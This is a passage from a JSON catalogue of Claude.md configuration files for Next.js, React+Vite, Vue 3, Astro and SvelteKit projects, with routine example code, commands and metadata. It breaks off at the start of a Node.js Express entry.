{
  "resources": [
    {
      "id": "nextjs-15-app-router",
      "title": "Next.js 15 App Router + TypeScript",
      "slug": "nextjs-15-app-router-typescript",
      "tagline": "Next.js configuration for intermediate developers",
      "description": "Complete claude.md configuration for Next.js 15 with App Router, TypeScript, Tailwind CSS, and modern development practices.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Next.js 15 App Router Project\n\n## Project Overview\n\nThis is a Next.js 15 application using the App Router, TypeScript, and Tailwind CSS. The project follows modern React patterns with server components, client components, and API routes.\n\n## Technology Stack\n\n- **Framework**: Next.js 15 with App Router\n- **Language**: TypeScript\n- **Styling**: Tailwind CSS\n- **State Management**: React hooks, Context API\n- **API**: Next.js API routes (app/api)\n- **Database**: [Add your database choice]\n- **Authentication**: [Add your auth solution]\n\n## Project Structure\n\n```\nsrc/\n├── app/                    # App Router pages and layouts\n│   ├── (auth)/            # Route groups\n│   ├── api/               # API routes\n│   ├── globals.css        # Global styles\n│   ├── layout.tsx         # Root layout\n│   └── page.tsx           # Home page\n├── components/            # Reusable React components\n│   ├── ui/               # Base UI components\n│   └── forms/            # Form components\n├── lib/                  # Utility functions\n├── hooks/                # Custom React hooks\n├── types/                # TypeScript type definitions\n└── utils/                # Helper functions\n```\n\n## Development Guidelines\n\n### Code Style\n- Use TypeScript strict mode\n- Prefer function components with hooks\n- Use server components by default, client components when needed\n- Follow Next.js naming conventions\n- Use Tailwind CSS for styling\n\n### Component Patterns\n- Create reusable UI components in `components/ui/`\n- Use custom hooks for shared logic\n- Implement proper error boundaries\n- Use React.Suspense for loading states\n\n### API Design\n- Use Next.js API routes in `app/api/`\n- Implement proper error handling\n- Use TypeScript for request/response types\n- Follow RESTful conventions\n\n### Performance\n- Optimize images with next/image\n- Use dynamic imports for code splitting\n- Implement proper caching strategies\n- Monitor Core Web Vitals\n\n## Key Commands\n\n- `npm run dev` - Start development server\n- `npm run build` - Build for production\n- `npm run start` - Start production server\n- `npm run lint` - Run ESLint\n- `npm run type-check` - Run TypeScript compiler\n\n## Environment Variables\n\nCreate a `.env.local` file with:\n```\nNEXT_PUBLIC_APP_URL=http://localhost:3000\nDATABASE_URL=your_database_url\nNEXTAUTH_SECRET=your_auth_secret\n```\n\n## Common Patterns\n\n### Server Component\n```tsx\n// app/products/page.tsx\nimport { getProducts } from '@/lib/api';\n\nexport default async function ProductsPage() {\n  const products = await getProducts();\n  \n  return (\n    <div>\n      {products.map(product => (\n        <ProductCard key={product.id} product={product} />\n      ))}\n    </div>\n  );\n}\n```\n\n### Client Component\n```tsx\n'use client';\n\nimport { useState } from 'react';\n\nexport default function Counter() {\n  const [count, setCount] = useState(0);\n  \n  return (\n    <button onClick={() => setCount(count + 1)}>\n      Count: {count}\n    </button>\n  );\n}\n```\n\n### API Route\n```tsx\n// app/api/products/route.ts\nimport { NextRequest, NextResponse } from 'next/server';\n\nexport async function GET(request: NextRequest) {\n  try {\n    const products = await fetchProducts();\n    return NextResponse.json(products);\n  } catch (error) {\n    return NextResponse.json(\n      { error: 'Failed to fetch products' },\n      { status: 500 }\n    );\n  }\n}\n```\n\n## Testing\n\n- Use Jest and React Testing Library\n- Write unit tests for utilities\n- Write integration tests for API routes\n- Use Playwright for e2e testing\n\n## Deployment\n\n- Deploy to Vercel for optimal Next.js experience\n- Configure environment variables\n- Set up monitoring and analytics\n- Enable caching strategies",
      "tags": [
        {
          "tag": {
            "id": "nextjs",
            "name": "nextjs",
            "slug": "nextjs"
          }
        },
        {
          "tag": {
            "id": "typescript",
            "name": "typescript",
            "slug": "typescript"
          }
        },
        {
          "tag": {
            "id": "react",
            "name": "react",
            "slug": "react"
          }
        },
        {
          "tag": {
            "id": "tailwind",
            "name": "tailwind",
            "slug": "tailwind"
          }
        },
        {
          "tag": {
            "id": "app-router",
            "name": "app-router",
            "slug": "app-router"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 29,
        "copies": 199
      },
      "_count": {
        "votes": 25,
        "copies": 68
      },
      "difficulty": "INTERMEDIATE",
      "language": "TypeScript",
      "framework": "Next.js",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "react-vite-typescript",
      "title": "React + Vite + TypeScript",
      "slug": "react-vite-typescript",
      "tagline": "React configuration for beginner developers",
      "description": "Modern React development setup with Vite, TypeScript, and essential tooling for fast development.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - React + Vite + TypeScript Project\n\n## Project Overview\n\nThis is a modern React application built with Vite for fast development, TypeScript for type safety, and Tailwind CSS for styling.\n\n## Technology Stack\n\n- **Framework**: React 18\n- **Build Tool**: Vite\n- **Language**: TypeScript\n- **Styling**: Tailwind CSS\n- **State Management**: React hooks, Zustand/Redux Toolkit\n- **Routing**: React Router DOM\n- **Testing**: Vitest, React Testing Library\n\n## Project Structure\n\n```\nsrc/\n├── components/           # React components\n│   ├── ui/              # Reusable UI components\n│   ├── forms/           # Form components\n│   └── layout/          # Layout components\n├── pages/               # Page components\n├── hooks/               # Custom React hooks\n├── store/               # State management\n├── utils/               # Utility functions\n├── types/               # TypeScript types\n├── styles/              # CSS and Tailwind styles\n└── main.tsx            # Application entry point\n```\n\n## Development Guidelines\n\n### Code Style\n- Use functional components with hooks\n- Implement TypeScript strict mode\n- Use Tailwind CSS for styling\n- Follow React best practices\n- Use ESLint and Prettier\n\n### Component Architecture\n- Create small, focused components\n- Use custom hooks for business logic\n- Implement proper prop typing\n- Use React.memo for performance optimization\n\n### State Management\n- Use React hooks for local state\n- Use Zustand or Redux Toolkit for global state\n- Implement proper data fetching patterns\n- Use React Query for server state\n\n## Key Commands\n\n- `npm run dev` - Start development server\n- `npm run build` - Build for production\n- `npm run preview` - Preview production build\n- `npm run test` - Run tests\n- `npm run lint` - Run linter\n\n## Environment Variables\n\nCreate a `.env` file:\n```\nVITE_API_URL=http://localhost:8000/api\nVITE_APP_TITLE=My React App\n```\n\n## Common Patterns\n\n### Component with TypeScript\n```tsx\ninterface ButtonProps {\n  variant?: 'primary' | 'secondary';\n  children: React.ReactNode;\n  onClick?: () => void;\n}\n\nexport const Button: React.FC<ButtonProps> = ({ \n  variant = 'primary', \n  children, \n  onClick \n}) => {\n  return (\n    <button\n      className={`btn btn-${variant}`}\n      onClick={onClick}\n    >\n      {children}\n    </button>\n  );\n};\n```\n\n### Custom Hook\n```tsx\nimport { useState, useEffect } from 'react';\n\nexport function useApi<T>(url: string) {\n  const [data, setData] = useState<T | null>(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState<string | null>(null);\n\n  useEffect(() => {\n    fetch(url)\n      .then(res => res.json())\n      .then(setData)\n      .catch(err => setError(err.message))\n      .finally(() => setLoading(false));\n  }, [url]);\n\n  return { data, loading, error };\n}\n```\n\n### Route Configuration\n```tsx\nimport { createBrowserRouter } from 'react-router-dom';\nimport { HomePage, AboutPage, ContactPage } from './pages';\n\nexport const router = createBrowserRouter([\n  {\n    path: '/',\n    element: <HomePage />\n  },\n  {\n    path: '/about',\n    element: <AboutPage />\n  },\n  {\n    path: '/contact',\n    element: <ContactPage />\n  }\n]);\n```\n\n## Performance Tips\n\n- Use React.lazy for code splitting\n- Implement virtual scrolling for large lists\n- Optimize bundle size with tree shaking\n- Use React DevTools for debugging\n\n## Testing\n\n- Write unit tests for components\n- Test custom hooks\n- Use MSW for API mocking\n- Implement integration tests\n\n## Deployment\n\n- Build optimized bundle with `npm run build`\n- Deploy to Netlify, Vercel, or similar\n- Configure environment variables\n- Set up CI/CD pipeline",
      "tags": [
        {
          "tag": {
            "id": "react",
            "name": "react",
            "slug": "react"
          }
        },
        {
          "tag": {
            "id": "vite",
            "name": "vite",
            "slug": "vite"
          }
        },
        {
          "tag": {
            "id": "typescript",
            "name": "typescript",
            "slug": "typescript"
          }
        },
        {
          "tag": {
            "id": "tailwind",
            "name": "tailwind",
            "slug": "tailwind"
          }
        },
        {
          "tag": {
            "id": "spa",
            "name": "spa",
            "slug": "spa"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 52,
        "copies": 237
      },
      "_count": {
        "votes": 21,
        "copies": 154
      },
      "difficulty": "BEGINNER",
      "language": "TypeScript",
      "framework": "React",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "vue3-composition-api",
      "title": "Vue 3 + Composition API + TypeScript",
      "slug": "vue3-composition-api-typescript",
      "tagline": "Vue.js configuration for intermediate developers",
      "description": "Modern Vue 3 application with Composition API, TypeScript, and Vue ecosystem best practices.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Vue 3 + Composition API + TypeScript Project\n\n## Project Overview\n\nThis is a Vue 3 application using the Composition API, TypeScript, and modern Vue.js development practices with Vite as the build tool.\n\n## Technology Stack\n\n- **Framework**: Vue 3\n- **API Style**: Composition API\n- **Language**: TypeScript\n- **Build Tool**: Vite\n- **State Management**: Pinia\n- **Routing**: Vue Router 4\n- **Styling**: CSS Modules, SCSS\n\n## Project Structure\n\n```\nsrc/\n├── components/          # Vue components\n│   ├── ui/             # Base UI components\n│   └── forms/          # Form components\n├── views/              # Page components (routes)\n├── composables/        # Composition API functions\n├── stores/             # Pinia stores\n├── router/             # Vue Router configuration\n├── utils/              # Utility functions\n├── types/              # TypeScript type definitions\n└── main.ts            # Application entry point\n```\n\n## Development Guidelines\n\n### Code Style  \n- Use Composition API over Options API\n- Implement TypeScript strict mode\n- Use `<script setup>` syntax\n- Follow Vue.js style guide\n- Use single-file components (.vue)\n\n### Component Architecture\n- Create composable functions for reusable logic\n- Use props validation with TypeScript\n- Implement proper event handling\n- Use Vue 3 teleport for modals/overlays\n\n### State Management\n- Use Pinia for global state management\n- Create typed stores\n- Use composables for local state\n- Implement proper reactive patterns\n\n## Key Commands\n\n- `npm run dev` - Start development server  \n- `npm run build` - Build for production\n- `npm run preview` - Preview production build\n- `npm run test` - Run unit tests\n- `npm run type-check` - TypeScript checking\n\n## Environment Variables\n\nCreate a `.env` file:\n```\nVITE_API_BASE_URL=http://localhost:3000/api\nVITE_APP_TITLE=My Vue App\n```\n\n## Common Patterns\n\n### Component with Composition API\n```vue\n<template>\n  <div class=\"user-profile\">\n    <h2>{{ user.name }}</h2>\n    <p>{{ user.email }}</p>\n    <button @click=\"updateProfile\">Update</button>\n  </div>\n</template>\n\n<script setup lang=\"ts\">\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\ninterface Props {\n  userId: number;\n}\n\nconst props = defineProps<Props>();\nconst emit = defineEmits<{\n  update: [user: User];\n}>();\n\nconst user = ref<User | null>(null);\nconst loading = ref(false);\n\nconst fetchUser = async (id: number) => {\n  loading.value = true;\n  try {\n    const response = await fetch(`/api/users/${id}`);\n    user.value = await response.json();\n  } finally {\n    loading.value = false;\n  }\n};\n\nconst updateProfile = () => {\n  if (user.value) {\n    emit('update', user.value);\n  }\n};\n\nonMounted(() => {\n  fetchUser(props.userId);\n});\n</script>\n```\n\n### Composable Function\n```ts\n// composables/useApi.ts\nimport { ref, Ref } from 'vue';\n\nexport function useApi<T>(url: string) {\n  const data: Ref<T | null> = ref(null);\n  const loading = ref(false);\n  const error = ref<string | null>(null);\n\n  const execute = async () => {\n    loading.value = true;\n    error.value = null;\n    \n    try {\n      const response = await fetch(url);\n      if (!response.ok) throw new Error(response.statusText);\n      data.value = await response.json();\n    } catch (err) {\n      error.value = err instanceof Error ? err.message : 'Unknown error';\n    } finally {\n      loading.value = false;\n    }\n  };\n\n  return {\n    data: readonly(data),\n    loading: readonly(loading),\n    error: readonly(error),\n    execute\n  };\n}\n```\n\n### Pinia Store\n```ts\n// stores/user.ts\nimport { defineStore } from 'pinia';\n\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\nexport const useUserStore = defineStore('user', () => {\n  const users = ref<User[]>([]);\n  const currentUser = ref<User | null>(null);\n\n  const fetchUsers = async () => {\n    const response = await fetch('/api/users');\n    users.value = await response.json();\n  };\n\n  const setCurrentUser = (user: User) => {\n    currentUser.value = user;\n  };\n\n  return {\n    users: readonly(users),\n    currentUser: readonly(currentUser),\n    fetchUsers,\n    setCurrentUser\n  };\n});\n```\n\n### Router Configuration\n```ts\n// router/index.ts\nimport { createRouter, createWebHistory } from 'vue-router';\nimport Home from '@/views/Home.vue';\n\nconst router = createRouter({\n  history: createWebHistory(),\n  routes: [\n    {\n      path: '/',\n      name: 'Home',\n      component: Home\n    },\n    {\n      path: '/about',\n      name: 'About',\n      component: () => import('@/views/About.vue')\n    }\n  ]\n});\n\nexport default router;\n```\n\n## Performance Tips\n\n- Use `v-memo` for expensive list rendering\n- Implement lazy loading with `defineAsyncComponent`\n- Use `shallowRef` for large objects\n- Optimize with `markRaw` for non-reactive data\n\n## Testing\n\n- Use Vue Test Utils with Vitest\n- Test components in isolation\n- Mock composables and stores\n- Write integration tests for complex flows\n\n## Deployment\n\n- Build with `npm run build`\n- Deploy to Netlify, Vercel, or similar\n- Configure build environment variables\n- Set up proper routing for SPA",
      "tags": [
        {
          "tag": {
            "id": "vue",
            "name": "vue",
            "slug": "vue"
          }
        },
        {
          "tag": {
            "id": "vue3",
            "name": "vue3",
            "slug": "vue3"
          }
        },
        {
          "tag": {
            "id": "typescript",
            "name": "typescript",
            "slug": "typescript"
          }
        },
        {
          "tag": {
            "id": "composition-api",
            "name": "composition-api",
            "slug": "composition-api"
          }
        },
        {
          "tag": {
            "id": "pinia",
            "name": "pinia",
            "slug": "pinia"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 34,
        "copies": 247
      },
      "_count": {
        "votes": 40,
        "copies": 60
      },
      "difficulty": "INTERMEDIATE",
      "language": "TypeScript",
      "framework": "Vue.js",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "astro-content-collections",
      "title": "Astro + Content Collections + TypeScript",
      "slug": "astro-content-collections-typescript",
      "tagline": "Astro configuration for intermediate developers",
      "description": "Static site generation with Astro, content collections, and TypeScript for fast, SEO-friendly websites.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Astro + Content Collections + TypeScript Project\n\n## Project Overview\n\nThis is an Astro project utilizing content collections, TypeScript, and static site generation for optimal performance and SEO.\n\n## Technology Stack\n\n- **Framework**: Astro\n- **Language**: TypeScript\n- **Content**: Content Collections (Markdown/MDX)\n- **Styling**: Tailwind CSS, CSS Modules\n- **Integrations**: React, Vue, or Svelte (as needed)\n- **Deployment**: Static hosting (Netlify, Vercel)\n\n## Project Structure\n\n```\nsrc/\n├── components/          # Astro/Framework components\n├── content/            # Content collections\n│   ├── blog/          # Blog posts\n│   ├── docs/          # Documentation\n│   └── config.ts      # Content config\n├── layouts/           # Page layouts\n├── pages/             # Routes and pages\n├── styles/            # Global styles\n└── utils/             # Utility functions\n```\n\n## Development Guidelines\n\n### Content Strategy\n- Use Content Collections for structured content\n- Write content in Markdown/MDX\n- Implement proper frontmatter schemas\n- Organize content logically\n\n### Component Architecture\n- Create reusable Astro components\n- Use framework components sparingly\n- Implement proper TypeScript typing\n- Optimize for static generation\n\n### Performance\n- Minimize JavaScript bundle size\n- Use Astro's partial hydration\n- Optimize images with Astro's image service\n- Implement proper caching strategies\n\n## Key Commands\n\n- `npm run dev` - Start development server\n- `npm run build` - Build static site\n- `npm run preview` - Preview built site\n- `npm run astro` - Run Astro CLI commands\n\n## Content Collections Configuration\n\n```ts\n// src/content/config.ts\nimport { defineCollection, z } from 'astro:content';\n\nconst blogCollection = defineCollection({\n  type: 'content',\n  schema: z.object({\n    title: z.string(),\n    description: z.string(),\n    pubDate: z.date(),\n    author: z.string(),\n    tags: z.array(z.string()),\n    image: z.string().optional(),\n  })\n});\n\nconst docsCollection = defineCollection({\n  type: 'content',\n  schema: z.object({\n    title: z.string(),\n    description: z.string(),\n    order: z.number(),\n    category: z.string(),\n  })\n});\n\nexport const collections = {\n  'blog': blogCollection,\n  'docs': docsCollection,\n};\n```\n\n## Common Patterns\n\n### Astro Component\n```astro\n---\n// src/components/BlogCard.astro\nexport interface Props {\n  title: string;\n  description: string;\n  pubDate: Date;\n  href: string;\n}\n\nconst { title, description, pubDate, href } = Astro.props;\n---\n\n<article class=\"blog-card\">\n  <h3><a href={href}>{title}</a></h3>\n  <p>{description}</p>\n  <time datetime={pubDate.toISOString()}>\n    {pubDate.toLocaleDateString()}\n  </time>\n</article>\n\n<style>\n.blog-card {\n  border: 1px solid #e2e8f0;\n  border-radius: 8px;\n  padding: 1.5rem;\n  transition: transform 0.2s;\n}\n\n.blog-card:hover {\n  transform: translateY(-2px);\n}\n</style>\n```\n\n### Page with Content Collection\n```astro\n---\n// src/pages/blog/index.astro\nimport { getCollection } from 'astro:content';\nimport BlogCard from '../../components/BlogCard.astro';\nimport Layout from '../../layouts/Layout.astro';\n\nconst blogPosts = await getCollection('blog');\nconst sortedPosts = blogPosts.sort(\n  (a, b) => b.data.pubDate.valueOf() - a.data.pubDate.valueOf()\n);\n---\n\n<Layout title=\"Blog\">\n  <main>\n    <h1>Blog Posts</h1>\n    <section class=\"posts-grid\">\n      {sortedPosts.map((post) => (\n        <BlogCard\n          title={post.data.title}\n          description={post.data.description}\n          pubDate={post.data.pubDate}\n          href={`/blog/${post.slug}`}\n        />\n      ))}\n    </section>\n  </main>\n</Layout>\n```\n\n### Dynamic Page Generation\n```astro\n---\n// src/pages/blog/[...slug].astro\nimport { getCollection } from 'astro:content';\nimport BlogLayout from '../../layouts/BlogLayout.astro';\n\nexport async function getStaticPaths() {\n  const blogEntries = await getCollection('blog');\n  return blogEntries.map(entry => ({\n    params: { slug: entry.slug },\n    props: { entry },\n  }));\n}\n\nconst { entry } = Astro.props;\nconst { Content } = await entry.render();\n---\n\n<BlogLayout frontmatter={entry.data}>\n  <Content />\n</BlogLayout>\n```\n\n### Integration with React Component\n```tsx\n// src/components/SearchBox.tsx\nimport { useState } from 'react';\n\ninterface SearchBoxProps {\n  placeholder?: string;\n  onSearch: (query: string) => void;\n}\n\nexport default function SearchBox({ \n  placeholder = \"Search...\", \n  onSearch \n}: SearchBoxProps) {\n  const [query, setQuery] = useState('');\n\n  const handleSubmit = (e: React.FormEvent) => {\n    e.preventDefault();\n    onSearch(query);\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <input\n        type=\"text\"\n        value={query}\n        onChange={(e) => setQuery(e.target.value)}\n        placeholder={placeholder}\n      />\n      <button type=\"submit\">Search</button>\n    </form>\n  );\n}\n```\n\n### Using React Component in Astro\n```astro\n---\nimport SearchBox from '../components/SearchBox.tsx';\n---\n\n<SearchBox \n  client:load \n  placeholder=\"Search posts...\"\n  onSearch={(query) => console.log(query)}\n/>\n```\n\n## SEO and Performance\n\n- Use proper meta tags in layouts\n- Implement structured data\n- Optimize Core Web Vitals\n- Use Astro's built-in image optimization\n- Implement proper sitemap generation\n\n## Content Management\n\n- Use frontmatter for metadata\n- Organize content in logical collections\n- Implement content validation with Zod\n- Use MDX for interactive content\n\n## Deployment\n\n- Build static site with `npm run build`\n- Deploy to any static hosting provider\n- Configure build environment variables\n- Set up continuous deployment from Git",
      "tags": [
        {
          "tag": {
            "id": "astro",
            "name": "astro",
            "slug": "astro"
          }
        },
        {
          "tag": {
            "id": "typescript",
            "name": "typescript",
            "slug": "typescript"
          }
        },
        {
          "tag": {
            "id": "ssg",
            "name": "ssg",
            "slug": "ssg"
          }
        },
        {
          "tag": {
            "id": "content-collections",
            "name": "content-collections",
            "slug": "content-collections"
          }
        },
        {
          "tag": {
            "id": "markdown",
            "name": "markdown",
            "slug": "markdown"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 16,
        "copies": 123
      },
      "_count": {
        "votes": 15,
        "copies": 153
      },
      "difficulty": "INTERMEDIATE",
      "language": "TypeScript",
      "framework": "Astro",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "sveltekit-app",
      "title": "SvelteKit + TypeScript + TailwindCSS",
      "slug": "sveltekit-typescript-tailwind",
      "tagline": "SvelteKit configuration for intermediate developers",
      "description": "Full-stack SvelteKit application with TypeScript, TailwindCSS, and modern Svelte development patterns.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - SvelteKit + TypeScript + TailwindCSS Project\n\n## Project Overview\n\nThis is a SvelteKit application with TypeScript and TailwindCSS, providing full-stack capabilities with server-side rendering and static site generation.\n\n## Technology Stack\n\n- **Framework**: SvelteKit\n- **Language**: TypeScript\n- **Styling**: TailwindCSS\n- **State Management**: Svelte stores\n- **Database**: [Your choice - Prisma, Drizzle, etc.]\n- **Authentication**: [Your choice - Auth.js, etc.]\n- **Deployment**: Vercel, Netlify, or Node.js\n\n## Project Structure\n\n```\nsrc/\n├── lib/                # Shared utilities and components\n│   ├── components/     # Reusable Svelte components\n│   ├── stores/         # Svelte stores\n│   └── utils/          # Utility functions\n├── routes/             # File-based routing\n│   ├── api/           # API endpoints\n│   ├── +layout.svelte # Root layout\n│   └── +page.svelte   # Home page\n├── app.html           # HTML template\n└── app.css           # Global styles\n```\n\n## Development Guidelines\n\n### Code Style\n- Use TypeScript for type safety\n- Follow Svelte conventions\n- Use TailwindCSS for styling\n- Implement proper component composition\n- Use SvelteKit's file-based routing\n\n### Component Architecture\n- Create reusable components in `lib/components/`\n- Use Svelte stores for global state\n- Implement proper prop typing\n- Use slots for component composition\n\n### Server-Side Features\n- Use load functions for data fetching\n- Implement API routes in `routes/api/`\n- Use form actions for form handling\n- Implement proper error handling\n\n## Key Commands\n\n- `npm run dev` - Start development server\n- `npm run build` - Build for production\n- `npm run preview` - Preview production build\n- `npm run check` - Run Svelte check\n- `npm run lint` - Run ESLint\n\n## Environment Variables\n\nCreate a `.env` file:\n```\nDATABASE_URL=your_database_url\nSECRET_KEY=your_secret_key\nPUBLIC_API_URL=http://localhost:5173/api\n```\n\n## Common Patterns\n\n### Svelte Component with TypeScript\n```svelte\n<!-- lib/components/UserCard.svelte -->\n<script lang=\"ts\">\n  export let user: {\n    id: number;\n    name: string;\n    email: string;\n    avatar?: string;\n  };\n  \n  export let showEmail = true;\n  export let clickable = false;\n  \n  import { createEventDispatcher } from 'svelte';\n  \n  const dispatch = createEventDispatcher<{\n    click: { user: typeof user };\n  }>();\n  \n  function handleClick() {\n    if (clickable) {\n      dispatch('click', { user });\n    }\n  }\n</script>\n\n<div \n  class=\"user-card\"\n  class:clickable\n  on:click={handleClick}\n  on:keydown={(e) => e.key === 'Enter' && handleClick()}\n  role={clickable ? 'button' : undefined}\n  tabindex={clickable ? 0 : undefined}\n>\n  {#if user.avatar}\n    <img src={user.avatar} alt=\"{user.name}'s avatar\" />\n  {/if}\n  \n  <div class=\"user-info\">\n    <h3>{user.name}</h3>\n    {#if showEmail}\n      <p>{user.email}</p>\n    {/if}\n  </div>\n</div>\n\n<style>\n  .user-card {\n    @apply p-4 border rounded-lg;\n  }\n  \n  .clickable {\n    @apply cursor-pointer hover:bg-gray-50 transition-colors;\n  }\n</style>\n```\n\n### Page with Load Function\n```svelte\n<!-- routes/users/+page.svelte -->\n<script lang=\"ts\">\n  import type { PageData } from './$types';\n  import UserCard from '$lib/components/UserCard.svelte';\n  \n  export let data: PageData;\n  \n  function handleUserClick(event: CustomEvent<{ user: typeof data.users[0] }>) {\n    console.log('User clicked:', event.detail.user);\n  }\n</script>\n\n<svelte:head>\n  <title>Users</title>\n  <meta name=\"description\" content=\"List of all users\" />\n</svelte:head>\n\n<main class=\"container mx-auto px-4 py-8\">\n  <h1 class=\"text-3xl font-bold mb-8\">Users</h1>\n  \n  <div class=\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6\">\n    {#each data.users as user (user.id)}\n      <UserCard \n        {user} \n        clickable \n        on:click={handleUserClick} \n      />\n    {/each}\n  </div>\n</main>\n```\n\n### Load Function\n```ts\n// routes/users/+page.ts\nimport type { PageLoad } from './$types';\n\nexport const load: PageLoad = async ({ fetch }) => {\n  const response = await fetch('/api/users');\n  \n  if (!response.ok) {\n    throw new Error('Failed to load users');\n  }\n  \n  const users = await response.json();\n  \n  return {\n    users\n  };\n};\n```\n\n### API Route\n```ts\n// routes/api/users/+server.ts\nimport { json } from '@sveltejs/kit';\nimport type { RequestHandler } from './$types';\n\nexport const GET: RequestHandler = async () => {\n  try {\n    // Fetch users from database\n    const users = await getUsersFromDatabase();\n    \n    return json(users);\n  } catch (error) {\n    return json(\n      { error: 'Failed to fetch users' },\n      { status: 500 }\n    );\n  }\n};\n\nexport const POST: RequestHandler = async ({ request }) => {\n  try {\n    const userData = await request.json();\n    const user = await createUser(userData);\n    \n    return json(user, { status: 201 });\n  } catch (error) {\n    return json(\n      { error: 'Failed to create user' },\n      { status: 400 }\n    );\n  }\n};\n```\n\n### Svelte Store\n```ts\n// lib/stores/user.ts\nimport { writable } from 'svelte/store';\n\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\nfunction createUserStore() {\n  const { subscribe, set, update } = writable<User[]>([]);\n  \n  return {\n    subscribe,\n    set,\n    add: (user: User) => update(users => [...users, user]),\n    remove: (id: number) => update(users => users.filter(u => u.id !== id)),\n    clear: () => set([])\n  };\n}\n\nexport const users = createUserStore();\n```\n\n### Form Actions\n```ts\n// routes/contact/+page.server.ts\nimport { fail } from '@sveltejs/kit';\nimport type { Actions } from './$types';\n\nexport const actions: Actions = {\n  default: async ({ request }) => {\n    const data = await request.formData();\n    const name = data.get('name') as string;\n    const email = data.get('email') as string;\n    const message = data.get('message') as string;\n    \n    if (!name || !email || !message) {\n      return fail(400, {\n        error: 'All fields are required',\n        name,\n        email,\n        message\n      });\n    }\n    \n    try {\n      await sendContactEmail({ name, email, message });\n      return { success: true };\n    } catch (error) {\n      return fail(500, {\n        error: 'Failed to send message',\n        name,\n        email,\n        message\n      });\n    }\n  }\n};\n```\n\n## Performance Tips\n\n- Use SvelteKit's preloading features\n- Implement proper code splitting\n- Optimize images and assets\n- Use SSR/SSG appropriately\n- Implement proper caching strategies\n\n## Testing\n\n- Use Vitest for unit testing\n- Test components with @testing-library/svelte\n- Use Playwright for e2e testing\n- Mock API calls in tests\n\n## Deployment\n\n- Configure adapter for your deployment target\n- Set up environment variables\n- Implement proper build optimization\n- Configure caching and CDN",
      "tags": [
        {
          "tag": {
            "id": "svelte",
            "name": "svelte",
            "slug": "svelte"
          }
        },
        {
          "tag": {
            "id": "sveltekit",
            "name": "sveltekit",
            "slug": "sveltekit"
          }
        },
        {
          "tag": {
            "id": "typescript",
            "name": "typescript",
            "slug": "typescript"
          }
        },
        {
          "tag": {
            "id": "tailwind",
            "name": "tailwind",
            "slug": "tailwind"
          }
        },
        {
          "tag": {
            "id": "fullstack",
            "name": "fullstack",
            "slug": "fullstack"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 35,
        "copies": 100
      },
      "_count": {
        "votes": 33,
        "copies": 148
      },
      "difficulty": "INTERMEDIATE",
      "language": "TypeScript",
      "framework": "SvelteKit",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "nodejs-express-typescript",
      "title": "Node.js Express + TypeScript API",
      "slug": "nodejs-express-typescript-api",
      "tagline": "Express.js configuration for intermediate developers",
      "description": "RESTful API built with Node.js, Express, TypeScript, and modern backend development practices.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
